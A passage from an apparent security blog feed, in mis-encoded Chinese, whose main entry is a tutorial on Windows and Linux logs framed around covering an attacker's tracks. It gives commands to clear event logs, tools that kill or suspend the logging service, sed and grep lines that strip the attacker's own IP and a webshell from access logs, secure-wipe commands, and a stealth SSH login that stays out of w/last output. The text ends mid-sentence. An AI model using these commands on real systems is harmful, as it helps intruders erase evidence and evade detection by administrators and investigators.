href="https://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x04-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88expectClass%E7%BB%95%E8%BF%87AutoType%EF%BC%89">https://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x04-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88expectClass%E7%BB%95%E8%BF%87AutoType%EF%BC%89</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;FastJSON-ç®€ä»‹&quot;&gt;&lt;a href=&quot;#FastJSON-ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;FastJSON ç®€ä»‹&quot;&gt;&lt;/a&gt;FastJSON ç®€ä»‹&lt;/h1&gt;&lt;p&gt;FastJson æ˜¯ä¸€ä¸ªç”±é˜¿é‡Œå·´å·´ç ”å‘çš„javaåº“ï¼Œå¯ä»¥æŠŠjavaå¯¹</summary>
      
    
    
    
    
    <category term="javaå¼€å‘ä¸å®‰å…¨" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>win&amp;linux æ—¥å¿—ç³»ç»Ÿä¸æ¸…é™¤</title>
    <link href="http://const27.com/2021/09/03/windows&amp;linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/"/>
    <id>http://const27.com/2021/09/03/windows&amp;linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/</id>
    <published>2021-09-03T13:09:34.996Z</published>
    <updated>2021-09-03T13:17:41.118Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WINDOWS-æ—¥å¿—"><a href="#WINDOWS-æ—¥å¿—" class="headerlink" title="WINDOWS æ—¥å¿—"></a>WINDOWS æ—¥å¿—</h1><p>Windowsæ—¥å¿—æœ‰è®¸å¤šç»†åˆ†ç±»ï¼š<br>windowsäº‹ä»¶æ—¥å¿—ï¼ŒIISæ—¥å¿—ï¼ŒFTPæ—¥å¿—ï¼Œé˜²ç«å¢™æ—¥å¿—ç­‰ç­‰ã€‚</p><h2 id="äº‹ä»¶æŸ¥çœ‹å™¨"><a href="#äº‹ä»¶æŸ¥çœ‹å™¨" class="headerlink" title="äº‹ä»¶æŸ¥çœ‹å™¨"></a>äº‹ä»¶æŸ¥çœ‹å™¨</h2><p>windowsç³»ç»Ÿè‡ªå¸¦ä¸€ä¸ªå«åšäº‹ä»¶æŸ¥çœ‹å™¨çš„å·¥å…·ï¼Œå®ƒå¯ä»¥åˆ†ææ‰€æœ‰çš„windowsç³»ç»Ÿæ—¥å¿—ã€‚<br>è¿è¡Œ-&gt;eventvwr å³å¯æ‰“å¼€ã€‚<br>å®ƒæŠŠæ—¥å¿—åˆ†ä¸ºäº†ä¸¤ç§ï¼Œä¸€ä¸ªæ˜¯WINDOWSæ—¥å¿—ï¼Œä¸€ä¸ªæ˜¯â€œåº”ç”¨ç¨‹åºå’ŒæœåŠ¡æ—¥å¿—â€</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726133040331.png" alt="image-20210726133040331"></p><p>äº‹ä»¶æŸ¥çœ‹å™¨å†…ç½®æœ‰ä¸‰ä¸ªæ ¸å¿ƒæ—¥å¿—æ–‡ä»¶ï¼šSYSTEM,SECURITY,APPLICATIONã€‚ä»–ä»¬çš„é»˜è®¤æœ€å¤§å®¹é‡ä¸º20MB.</p><h3 id="äº‹ä»¶ç±»å‹"><a href="#äº‹ä»¶ç±»å‹" class="headerlink" title="äº‹ä»¶ç±»å‹"></a>äº‹ä»¶ç±»å‹</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726133715232.png" alt="image-20210726133715232"></p><p>äº‹ä»¶æŸ¥çœ‹å™¨æŠŠæ—¶é—´åˆ†ç±»ä¸ºäº†äº”ç§ç±»å‹ï¼š</p><p>ä¿¡æ¯ï¼ˆInformationï¼‰</p><p>ä¿¡æ¯äº‹ä»¶æŒ‡åº”ç”¨ç¨‹åºã€é©±åŠ¨ç¨‹åºæˆ–æœåŠ¡çš„æˆåŠŸæ“ä½œçš„äº‹ä»¶ã€‚</p><p>è­¦å‘Šï¼ˆWarningï¼‰</p><p>è­¦å‘Šäº‹ä»¶æŒ‡ä¸æ˜¯ç›´æ¥çš„ã€ä¸»è¦çš„ï¼Œä½†æ˜¯ä¼šå¯¼è‡´å°†æ¥é—®é¢˜å‘ç”Ÿçš„é—®é¢˜ã€‚ä¾‹å¦‚ï¼Œå½“ç£ç›˜ç©ºé—´ä¸è¶³æˆ–æœªæ‰¾åˆ°æ‰“å°æœºæ—¶ï¼Œéƒ½ä¼šè®°å½•ä¸€ä¸ªâ€œè­¦å‘Šâ€äº‹ä»¶ã€‚</p><p>é”™è¯¯ï¼ˆErrorï¼‰</p><p>é”™è¯¯äº‹ä»¶æŒ‡ç”¨æˆ·åº”è¯¥çŸ¥é“çš„é‡è¦çš„é—®é¢˜ã€‚é”™è¯¯äº‹ä»¶é€šå¸¸æŒ‡åŠŸèƒ½å’Œæ•°æ®çš„ä¸¢å¤±ã€‚ä¾‹å¦‚,å¦‚æœä¸€ä¸ªæœåŠ¡ä¸èƒ½ä½œä¸ºç³»ç»Ÿå¼•å¯¼è¢«åŠ è½½ï¼Œé‚£ä¹ˆå®ƒä¼šäº§ç”Ÿä¸€ä¸ªé”™è¯¯äº‹ä»¶ã€‚</p><p>æˆåŠŸå®¡æ ¸ï¼ˆSuccess auditï¼‰</p><p>æˆåŠŸçš„å®¡æ ¸å®‰å…¨è®¿é—®å°è¯•ï¼Œä¸»è¦æ˜¯æŒ‡å®‰å…¨æ€§æ—¥å¿—ï¼Œè¿™é‡Œè®°å½•ç€ç”¨æˆ·ç™»å½•/æ³¨é”€ã€å¯¹è±¡è®¿é—®ã€ç‰¹æƒä½¿ç”¨ã€è´¦æˆ·ç®¡ç†ã€ç­–ç•¥æ›´æ”¹ã€è¯¦ç»†è·Ÿè¸ªã€ç›®å½•æœåŠ¡è®¿é—®ã€è´¦æˆ·ç™»å½•ç­‰äº‹ä»¶ï¼Œä¾‹å¦‚æ‰€æœ‰çš„æˆåŠŸç™»å½•ç³»ç»Ÿéƒ½ä¼šè¢«è®°å½•ä¸ºâ€œ æˆåŠŸå®¡æ ¸â€äº‹ä»¶ã€‚</p><p>å¤±è´¥å®¡æ ¸ï¼ˆFailure auditï¼‰</p><p>å¤±è´¥çš„å®¡æ ¸å®‰å…¨ç™»å½•å°è¯•ï¼Œä¾‹å¦‚ç”¨æˆ·è¯•å›¾è®¿é—®ç½‘ç»œé©±åŠ¨å™¨å¤±è´¥ï¼Œåˆ™è¯¥å°è¯•ä¼šè¢«ä½œä¸ºå¤±è´¥å®¡æ ¸äº‹ä»¶è®°å½•ä¸‹æ¥ã€‚</p><h2 id="åˆ é™¤æ—¥å¿—"><a href="#åˆ é™¤æ—¥å¿—" class="headerlink" title="åˆ é™¤æ—¥å¿—"></a>åˆ é™¤æ—¥å¿—</h2><p>Windowså¹¶æ²¡æœ‰ç›´æ¥æä¾›åˆ é™¤ç‰¹ç‚¹æ—¥å¿—çš„åŠŸèƒ½ï¼Œäº‹ä»¶æŸ¥çœ‹å™¨ä¹Ÿåªæä¾›äº†ä¸€ä¸ªæ¸…é™¤æ—¥å¿—çš„é€‰é¡¹ï¼ŒåŸå› æ˜¯æ—¥å¿—è®°å½•çš„IDæ˜¯è¿ç»­çš„ï¼Œé»˜è®¤çš„æ’åºæ–¹å¼æ˜¯ä»å¤§åˆ°å°å¾€ä¸‹æ’åˆ—ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726134334720.png" alt="image-20210726134334720"></p><h3 id="æ¸…ç©ºæ—¥å¿—"><a href="#æ¸…ç©ºæ—¥å¿—" class="headerlink" title="æ¸…ç©ºæ—¥å¿—"></a>æ¸…ç©ºæ—¥å¿—</h3><p>æš´åŠ›ä¸€ç‚¹ï¼Œå¯ä»¥ç›´æ¥æŠŠæ—¥å¿—å…¨éƒ¨åˆ é™¤ã€‚</p><p>å¼€å§‹â†’è¿è¡Œ,è¾“å…¥ <code>eventvwr</code> è¿›å…¥äº‹ä»¶æŸ¥çœ‹å™¨ï¼Œå³è¾¹æ é€‰æ‹©æ¸…é™¤æ—¥å¿—ã€‚</p><p>æˆ–è€…é€šè¿‡powershellé€‰å®šæ—¥å¿—åˆ é™¤</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ï¼ˆaï¼‰PowerShell -Command &quot;&amp; &#123;Clear-Eventlog -Log Application,System,Security,&#39;windows powershell&#39;&#125;&quot;</span><br><span class="line">ï¼ˆbï¼‰Get-WinEvent -ListLog Application,Setup,Security -Force | % &#123;Wevtutil.exe cl $_.Logname&#125;</span><br></pre></td></tr></table></figure><p>å«Œpowershellå¤ªé•¿å¯ä»¥ç”¨wevtutil</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wevtutil el             åˆ—å‡ºç³»ç»Ÿä¸­æ‰€æœ‰æ—¥å¿—åç§°</span><br><span class="line">wevtutil cl system      æ¸…ç†ç³»ç»Ÿæ—¥å¿—</span><br><span class="line">wevtutil cl application æ¸…ç†åº”ç”¨ç¨‹åºæ—¥å¿—</span><br><span class="line">wevtutil cl security    æ¸…ç†å®‰å…¨æ—¥å¿—</span><br></pre></td></tr></table></figure><h3 id="æ—¥å¿—ä¼ªé€ "><a href="#æ—¥å¿—ä¼ªé€ " class="headerlink" title="æ—¥å¿—ä¼ªé€ "></a>æ—¥å¿—ä¼ªé€ </h3><p>å¯ä»¥é€šè¿‡eventcreateè¿™ä¸ªè‡ªå¸¦å·¥å…·ä¼ªé€ æ—¥å¿—æˆ–è€…è‡ªå®šä¹‰å¤§é‡åƒåœ¾ä¿¡æ¯è¦†ç›–ç°æœ‰æ—¥å¿—ï¼ˆæ—¥å¿—æœ€å¤§å®¹é‡20MBï¼‰</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eventcreate -l system -so administrator -t warning -d &quot;this is a test&quot; -id 500</span><br></pre></td></tr></table></figure><h3 id="æš‚åœæ—¥å¿—è®°å½•"><a href="#æš‚åœæ—¥å¿—è®°å½•" class="headerlink" title="æš‚åœæ—¥å¿—è®°å½•"></a>æš‚åœæ—¥å¿—è®°å½•</h3><p>å¯ä»¥é€šè¿‡å·¥å…·<a href="https://github.com/hlldz/Invoke-Phant0m%EF%BC%8C%E6%9D%A5%E4%BD%BF%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E7%BB%88%E6%AD%A2%E3%80%82%E8%BF%99%E4%B8%AA%E5%B7%A5%E5%85%B7%E4%BB%85%E6%94%AF%E6%8C%81X64">https://github.com/hlldz/Invoke-Phant0mï¼Œæ¥ä½¿æ—¥å¿—è®°å½•ç»ˆæ­¢ã€‚è¿™ä¸ªå·¥å…·ä»…æ”¯æŒX64</a></p><p>è¯¥è„šæœ¬éå†äº‹ä»¶æ—¥å¿—æœåŠ¡è¿›ç¨‹ï¼ˆä¸“ç”¨svchost.exeï¼‰çš„çº¿ç¨‹å †æ ˆï¼Œå¹¶æ ‡è¯†äº‹ä»¶æ—¥å¿—çº¿ç¨‹ä»¥æ€æ­»äº‹ä»¶æ—¥å¿—æœåŠ¡çº¿ç¨‹ã€‚å› æ­¤ï¼Œç³»ç»Ÿå°†æ— æ³•æ”¶é›†æ—¥å¿—ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726140507925.png" alt="image-20210726140507925"></p><p>éšåæ–°å¢ç”¨æˆ·ï¼Œå‘ç°æ—¥å¿—ä¸­æ— è®°å½•ï¼Œçœ‹æ¥æ—¥å¿—è®°å½•ç¡®å®æ˜¯è¢«ç»ˆæ­¢äº†ã€‚</p><h3 id="å•æ¡æ—¥å¿—æ¸…é™¤"><a href="#å•æ¡æ—¥å¿—æ¸…é™¤" class="headerlink" title="å•æ¡æ—¥å¿—æ¸…é™¤"></a>å•æ¡æ—¥å¿—æ¸…é™¤</h3><p><a href="https://github.com/QAX-A-Team/EventCleaner">https://github.com/QAX-A-Team/EventCleaner</a></p><p>è¿™ä¸ªå·¥å…·ä¹Ÿå¯ä»¥æš‚åœæ—¥å¿—çº¿ç¨‹åœæ­¢æ—¥å¿—è®°å½•ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥æ¢å¤æ—¥å¿—çº¿ç¨‹ã€‚ä½†æ˜¯æ›´é‡è¦çš„æ˜¯å®ƒå¯ä»¥åˆ é™¤å•æŒ‘æ—¥å¿—è®°å½•</p><p>å®˜æ–¹æè¿°</p><ol><li>EventCleaner closehandle  è§£é™¤ security.evtxçš„æ–‡ä»¶å å‘</li><li>EventCleaner 100 åˆ é™¤IDä¸º100çš„æ—¥å¿—(å¿…é¡»åœ¨ä¹‹å‰ä½¿ç”¨EventCleaner  closehandle)</li><li>EventCleaner suspend æš‚åœæ—¥å¿—çº¿ç¨‹,åœæ­¢æ—¥å¿—è®°å½•</li><li>do anything without worrying about logs</li><li>EventCleaner normal æ¢å¤æ—¥å¿—çº¿ç¨‹</li><li>delete EventCleaner</li></ol><h2 id="å„æ—¥å¿—ä½ç½®åŠæ‰‹åŠ¨æ¸…é™¤"><a href="#å„æ—¥å¿—ä½ç½®åŠæ‰‹åŠ¨æ¸…é™¤" class="headerlink" title="å„æ—¥å¿—ä½ç½®åŠæ‰‹åŠ¨æ¸…é™¤"></a>å„æ—¥å¿—ä½ç½®åŠæ‰‹åŠ¨æ¸…é™¤</h2><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è·¯å¾„ %SystemDrive%\inetpub\logs\LogFiles\W3SVC1\</span><br></pre></td></tr></table></figure><p>æ¸…é™¤WWWæ—¥å¿—(å…¶å®å¹¶ä¸éœ€è¦åœæ­¢æœåŠ¡éƒ½èƒ½åˆ )ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">åœæ­¢æœåŠ¡ï¼šnet stop w3svc</span><br><span class="line">åˆ é™¤æ—¥å¿—ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼šdel *.*</span><br><span class="line">å¯ç”¨æœåŠ¡ï¼šnet start w3svc</span><br></pre></td></tr></table></figure><h3 id="åº”ç”¨ç¨‹åºæ—¥å¿—ï¼Œå®‰å…¨æ—¥å¿—ï¼Œç³»ç»Ÿæ—¥å¿—"><a href="#åº”ç”¨ç¨‹åºæ—¥å¿—ï¼Œå®‰å…¨æ—¥å¿—ï¼Œç³»ç»Ÿæ—¥å¿—" class="headerlink" title="åº”ç”¨ç¨‹åºæ—¥å¿—ï¼Œå®‰å…¨æ—¥å¿—ï¼Œç³»ç»Ÿæ—¥å¿—"></a>åº”ç”¨ç¨‹åºæ—¥å¿—ï¼Œå®‰å…¨æ—¥å¿—ï¼Œç³»ç»Ÿæ—¥å¿—</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%systemroot%\system32\config\AppEvent.EVT;</span><br><span class="line">%systemroot%\system32\config\SecEvent.EVT;</span><br><span class="line">%systemroot%\system32\config\SysEvent.EVT;</span><br></pre></td></tr></table></figure><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%systemroot%\system32\logfiles\msftpsvc1\</span><br></pre></td></tr></table></figure><h3 id="è¿œç¨‹æ¡Œé¢"><a href="#è¿œç¨‹æ¡Œé¢" class="headerlink" title="è¿œç¨‹æ¡Œé¢"></a>è¿œç¨‹æ¡Œé¢</h3><p>ç›´æ¥å«–è„šæœ¬</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; &#x2F;va &#x2F;f # åˆ é™¤Defaultä¸­çš„æ‰€æœ‰å€¼</span><br><span class="line">reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; &#x2F;f # åˆ é™¤æ•´ä¸ªServers</span><br><span class="line">reg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; é‡æ–°åˆ›å»ºåˆ é™¤çš„æ³¨å†Œè¡¨é¡¹</span><br><span class="line">cd %userprofile%\documents\ # è½¬åˆ°Default.rdpæ–‡ä»¶ç›®å½•</span><br><span class="line">attrib Default.rdp -s -h # æ›´æ”¹Default.rdpæ–‡ä»¶å±æ€§ï¼Œé»˜è®¤æƒ…å†µä¸‹å®ƒæ˜¯éšè—</span><br><span class="line">del Default.rdp  # åˆ é™¤æ–‡ä»¶Default.rdpæ–‡ä»¶</span><br></pre></td></tr></table></figure><h2 id="å½»åº•åˆ é™¤æ—¥å¿—"><a href="#å½»åº•åˆ é™¤æ—¥å¿—" class="headerlink" title="å½»åº•åˆ é™¤æ—¥å¿—"></a>å½»åº•åˆ é™¤æ—¥å¿—</h2><p>å¦‚ä½•å½»åº•åˆ é™¤æ—¥å¿—ï¼Ÿè¦çŸ¥é“ä»…ä»…æ˜¯æ™®é€šçš„åˆ é™¤å‘½ä»¤å®é™…ä¸Šæ˜¯å¹¶ä¸èƒ½åšåˆ°å®Œå…¨åˆ é™¤çš„ï¼Œå¾ˆå®¹æ˜“è¢«æ‰¾åˆ°åˆ é™¤æ–‡ä»¶ã€‚</p><h3 id="Cipher-å‘½ä»¤å¤šæ¬¡è¦†å†™"><a href="#Cipher-å‘½ä»¤å¤šæ¬¡è¦†å†™" class="headerlink" title="Cipher å‘½ä»¤å¤šæ¬¡è¦†å†™"></a>Cipher å‘½ä»¤å¤šæ¬¡è¦†å†™</h3><p>åœ¨åˆ é™¤æ–‡ä»¶åï¼Œå¯ä»¥åˆ©ç”¨Cipher å‘½ä»¤é€šè¿‡ /W å‚æ•°å¯åå¤å†™å…¥å…¶ä»–æ•°æ®è¦†ç›–å·²åˆ é™¤æ–‡ä»¶çš„ç¡¬ç›˜ç©ºé—´ï¼Œå½»åº•åˆ é™¤æ•°æ®é˜²æ­¢è¢«æ¢å¤ã€‚æ¯”å¦‚</p><p>åˆšåˆšåˆ é™¤<code>D:\tools</code>ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œæ‰§è¡Œ<code>cipher /w:D:\tools</code>ï¼ŒD ç›˜ä¸Šæœªä½¿ç”¨ç©ºé—´å°±ä¼šè¢«è¦†ç›–ä¸‰æ¬¡ï¼šä¸€æ¬¡ 0x00ã€ä¸€æ¬¡ 0xFFï¼Œä¸€æ¬¡éšæœºæ•°ï¼Œæ‰€æœ‰è¢«åˆ é™¤çš„æ–‡ä»¶å°±éƒ½ä¸å¯èƒ½è¢«æ¢å¤äº†ã€‚</p><h3 id="Formatå‘½ä»¤è¦†ç›–æ ¼å¼åŒ–"><a href="#Formatå‘½ä»¤è¦†ç›–æ ¼å¼åŒ–" class="headerlink" title="Formatå‘½ä»¤è¦†ç›–æ ¼å¼åŒ–"></a><strong>Formatå‘½ä»¤è¦†ç›–æ ¼å¼åŒ–</strong></h3><p>Format å‘½ä»¤åŠ ä¸Š /P å‚æ•°åï¼Œå°±ä¼šæŠŠæ¯ä¸ªæ‰‡åŒºå…ˆæ¸…é›¶ï¼Œå†ç”¨éšæœºæ•°è¦†ç›–ã€‚è€Œä¸”å¯ä»¥è¦†ç›–å¤šæ¬¡ã€‚æ¯”å¦‚</p><p><code>format D: /P:8</code>å°±è¡¨ç¤ºæŠŠ D ç›˜ç”¨éšæœºæ•°è¦†ç›– 8 æ¬¡ã€‚</p><h1 id="LINUX-æ—¥å¿—"><a href="#LINUX-æ—¥å¿—" class="headerlink" title="LINUX æ—¥å¿—"></a>LINUX æ—¥å¿—</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">var</span>/log/message ç³»ç»Ÿå¯åŠ¨åçš„ä¿¡æ¯å’Œé”™è¯¯æ—¥å¿—ï¼Œæ˜¯Red Hat Linuxä¸­æœ€å¸¸ç”¨çš„æ—¥å¿—ä¹‹ä¸€</span><br><span class="line">/<span class="keyword">var</span>/log/secure ä¸å®‰å…¨ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯</span><br><span class="line">/<span class="keyword">var</span>/log/maillog ä¸é‚®ä»¶ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯</span><br><span class="line">/<span class="keyword">var</span>/log/cron ä¸å®šæ—¶ä»»åŠ¡ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯</span><br><span class="line">/<span class="keyword">var</span>/log/spooler ä¸UUCPå’Œnewsè®¾å¤‡ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯</span><br><span class="line">/<span class="keyword">var</span>/log/boot.log å®ˆæŠ¤è¿›ç¨‹å¯åŠ¨å’Œåœæ­¢ç›¸å…³çš„æ—¥å¿—æ¶ˆæ¯</span><br><span class="line">/<span class="keyword">var</span>/log/wtmp è¯¥æ—¥å¿—æ–‡ä»¶æ°¸ä¹…è®°å½•æ¯ä¸ªç”¨æˆ·ç™»å½•ã€æ³¨é”€åŠç³»ç»Ÿçš„å¯åŠ¨ã€åœæœºçš„äº‹ä»¶,ç”¨lastæŸ¥çœ‹</span><br><span class="line">/<span class="keyword">var</span>/log/btmp   è®°å½•æ‰€æœ‰ç™»å½•å¤±è´¥ä¿¡æ¯ï¼Œä½¿ç”¨lastbå‘½ä»¤æŸ¥çœ‹</span><br><span class="line">/<span class="keyword">var</span>/log/lastlog è®°å½•ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·æœ€åä¸€æ¬¡ç™»å½•æ—¶é—´çš„æ—¥å¿—ï¼Œä½¿ç”¨lastlogå‘½ä»¤æŸ¥çœ‹</span><br><span class="line">/<span class="keyword">var</span>/log/utmp    è®°å½•å½“å‰å·²ç»ç™»å½•çš„ç”¨æˆ·ä¿¡æ¯ï¼Œä½¿ç”¨w,who,usersç­‰å‘½ä»¤æŸ¥çœ‹</span><br><span class="line">~/.bash_history æ‰§è¡Œçš„å‘½ä»¤,ç”¨ histroy -c å³å¯åˆ é™¤</span><br></pre></td></tr></table></figure><h2 id="æ¸…ç©ºæ—¥å¿—-1"><a href="#æ¸…ç©ºæ—¥å¿—-1" class="headerlink" title="æ¸…ç©ºæ—¥å¿—"></a>æ¸…ç©ºæ—¥å¿—</h2><p>æ¸…é™¤ç”¨æˆ·æœ€åä¸€æ¬¡ç™»å½•æ—¶é—´ï¼šecho &gt; /var/log/lastlog          #lastlogå‘½ä»¤<br>æ¸…é™¤å½“å‰ç™»å½•ç”¨æˆ·çš„ä¿¡æ¯ï¼šecho &gt;   /var/log/utmp             #ä½¿ç”¨w,who,usersç­‰å‘½ä»¤<br>æ¸…é™¤å®‰å…¨æ—¥å¿—è®°å½•ï¼šcat /dev/null &gt;  /var/log/secure<br>æ¸…é™¤ç³»ç»Ÿæ—¥å¿—è®°å½•ï¼šcat /dev/null &gt;  /var/log/message</p><p>è¯¸å¦‚æ­¤ç±»â€¦</p><h2 id="æ›¿æ¢-åˆ é™¤éƒ¨åˆ†æ—¥å¿—"><a href="#æ›¿æ¢-åˆ é™¤éƒ¨åˆ†æ—¥å¿—" class="headerlink" title="æ›¿æ¢/åˆ é™¤éƒ¨åˆ†æ—¥å¿—"></a>æ›¿æ¢/åˆ é™¤éƒ¨åˆ†æ—¥å¿—</h2><p>æ—¥å¿—æ–‡ä»¶è¢«æ¸…ç©ºä¼šå¼•èµ·ç®¡ç†å‘˜è­¦è§‰ï¼Œæ‰€ä»¥å¯ä»¥åªæ›¿æ¢æˆ–åˆ é™¤å…³é”®ä¿¡æ¯ï¼Œå®ç°éšç§˜æ”»å‡»çš„ç›®çš„ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># åˆ é™¤æ‰€æœ‰åŒ¹é…åˆ°å­—ç¬¦ä¸²çš„è¡Œ,æ¯”å¦‚ä»¥å½“å¤©æ—¥æœŸæˆ–è€…è‡ªå·±çš„ç™»å½•ip</span><br><span class="line">sed  -i &#39;&#x2F;è‡ªå·±çš„ip&#x2F;&#39;d  &#x2F;var&#x2F;log&#x2F;messages</span><br><span class="line"></span><br><span class="line"># å…¨å±€æ›¿æ¢ç™»å½•IPåœ°å€ï¼š</span><br><span class="line">sed -i &#39;s&#x2F;192.168.166.85&#x2F;192.168.1.1&#x2F;g&#39; secure</span><br><span class="line"></span><br><span class="line">å¯¹äºWEBæœåŠ¡è¿˜å¯ä»¥è¿™æ ·éšè—æˆ‘ä»¬çš„é©¬</span><br><span class="line"># ä½¿ç”¨grep -væ¥æŠŠæˆ‘ä»¬çš„ç›¸å…³ä¿¡æ¯åˆ é™¤,</span><br><span class="line">cat &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log | grep -v evil.php &gt; tmp.log</span><br><span class="line"></span><br><span class="line"># æŠŠä¿®æ”¹è¿‡çš„æ—¥å¿—è¦†ç›–åˆ°åŸæ—¥å¿—æ–‡ä»¶</span><br><span class="line">cat tmp.log &gt; &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&#x2F;</span><br></pre></td></tr></table></figure><h2 id="å½»åº•åˆ é™¤"><a href="#å½»åº•åˆ é™¤" class="headerlink" title="å½»åº•åˆ é™¤"></a>å½»åº•åˆ é™¤</h2><h3 id="shred"><a href="#shred" class="headerlink" title="shred"></a>shred</h3><p>-n æŒ‡å®šè¦†å†™æ¬¡æ•°ï¼Œé»˜è®¤3æ¬¡</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shred -f -u -z -v -n 8 1.txt </span><br></pre></td></tr></table></figure><h3 id="dd"><a href="#dd" class="headerlink" title="dd"></a>dd</h3><p>è¿™ä¸ªå‘½ä»¤ç”¨äºæ¸…ç©ºæ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;è¦åˆ é™¤çš„æ–‡ä»¶</span><br></pre></td></tr></table></figure><h3 id="wipe"><a href="#wipe" class="headerlink" title="wipe"></a>wipe</h3><p>å¾ˆç®€å•æ˜“ç”¨ï¼Œä½†æ˜¯ä¸€èˆ¬ä¸æ˜¯è£…æœºè‡ªå¸¦</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wipe filename</span><br></pre></td></tr></table></figure><h3 id="Secure-Delete"><a href="#Secure-Delete" class="headerlink" title="Secure-Delete"></a><strong>Secure-Delete</strong></h3><p>secure-deleteæ˜¯ä¸€ä¸ªé›†æˆåŒ–å·¥å…·åŒ…ï¼Œæ”¶å½•äº†äº›å®‰å…¨åˆ é™¤æ–‡ä»¶çš„å‘½ä»¤è¡Œå·¥å…·ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">srm filename</span><br><span class="line">sfill &#x2F;a   ç”¨éšæœºæ•°å¡«å……ç©ºé—²æˆ–è€…å¯ç”¨çš„ç©ºé—´ï¼Œä¿è¯æ²¡æœ‰å¯æ¢å¤çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹</span><br></pre></td></tr></table></figure><p>sswapç”¨äºå®‰å…¨åœ°æ¸…é™¤äº¤æ¢åˆ†åŒºã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;swaps æ‰¾åˆ°äº¤æ¢åˆ†åŒº</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726184935968.png" alt="image-20210726184935968"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sswap &#x2F;www&#x2F;swap</span><br></pre></td></tr></table></figure><p>smemç”¨äºæ¸…ç†åœ¨å†…å­˜ä¸­çš„å†…å®¹ï¼Œæä¾›å®‰å…¨åœ°å†…å­˜æ¸…ç†:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smem</span><br></pre></td></tr></table></figure><h2 id="SSHéšèº«ç™»å½•"><a href="#SSHéšèº«ç™»å½•" class="headerlink" title="SSHéšèº«ç™»å½•"></a>SSHéšèº«ç™»å½•</h2><p>ssh -T <a href="mailto:&#114;&#111;&#x6f;&#116;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#x2e;&#49;&#57;&#x39;&#46;&#49;&#x32;&#51;">&#114;&#111;&#x6f;&#116;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#x2e;&#49;&#57;&#x39;&#46;&#49;&#x32;&#51;</a> /usr/bin/bash -i</p><p>-Tè¡¨ç¤ºä¸åˆ†é…ä¼ªç»ˆç«¯ï¼Œ/usr/bin/bash -i è¡¨ç¤ºåœ¨ç™»å½•åè°ƒç”¨bashå‘½ä»¤ -i è¡¨ç¤ºæ˜¯äº¤äº’å¼shelï¼Œè¿™æ ·ç™»é™†å°†ä¸ä¼šåœ¨w/lastå‘½ä»¤ç»“æœä¸­æ˜¾ç¤º.</p><p>ä½†æ˜¯ä¼šè¢«lsof -i:22 å’Œ ps |grep ssh 